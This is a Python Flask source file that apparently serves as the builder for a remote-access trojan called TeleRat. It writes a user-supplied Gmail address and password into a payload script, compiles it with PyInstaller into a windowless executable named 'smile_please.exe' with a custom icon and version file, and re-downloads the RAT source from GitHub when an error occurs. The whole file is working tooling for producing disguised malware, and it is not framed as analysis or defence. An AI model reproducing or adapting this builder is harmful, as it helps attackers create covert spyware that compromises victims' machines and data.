import os,wget
from shutil import copyfile
from flaskwebgui import FlaskUI
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def welcome():
    return render_template("Build.html")

@app.route('/build',methods=['POST','GET'])
def output():
    start(request.form['gmail'],request.form['password'])
    return render_template("Built.html")

@app.errorhandler(500)
def internal_error(error):
    os.remove('Source_Files\telerat.py')
    wget.download('https://raw.githubusercontent.com/navin-hariharan/TeleRat/main/Source_Files/telerat.py','Source_Files\telerat.py')

@app.errorhandler(404)
def not_found(error):
    return render_template("Build.html")

def start(gmail,password):
        with open('Source_Files/smile_please.py', 'r') as file :
            filedata = file.read()
        if 'your_gmail@gmail.com' in filedata:
            filedata = filedata.replace('your_gmail@gmail.com',gmail)
        with open('Source_Files/smile_please.py', 'w') as file:
            file.write(filedata)
        with open('Source_Files/smile_please.py', 'r') as file :
            filedata = file.read()
        if 'your_password@1234' in filedata:
            filedata = filedata.replace('your_password@1234',password)
        with open('Source_Files/smile_please.py', 'w') as file:
            file.write(filedata)


        os.system('pyinstaller --onefile --icon=Source_Files/icon.ico --version-file Source_Files/version.txt --noconsole Source_Files/smile_please.py')
        os.system('rd /s /q build')
        os.remove('smile_please.spec')
        copyfile('dist/smile_please.exe', 'smile_please.exe')
        os.system('rd /s /q dist')


        with open('Source_Files/smile_please.py', 'r') as file :
            filedata = file.read()
        if gmail in filedata:
            filedata = filedata.replace(gmail,'your_gmail@gmail.com')
        with open('Source_Files/smile_please.py', 'w') as file:
            file.write(filedata)
        with open('Source_Files/smile_please.py', 'r') as file :
            filedata = file.read()
        if password in filedata:
            filedata = filedata.replace(password,'your_password@1234')
        with open('Source_Files/smile_please.py', 'w') as file:
            file.write(filedata)

if __name__ == '__main__':
    FlaskUI(app, width=360, height=590).run()
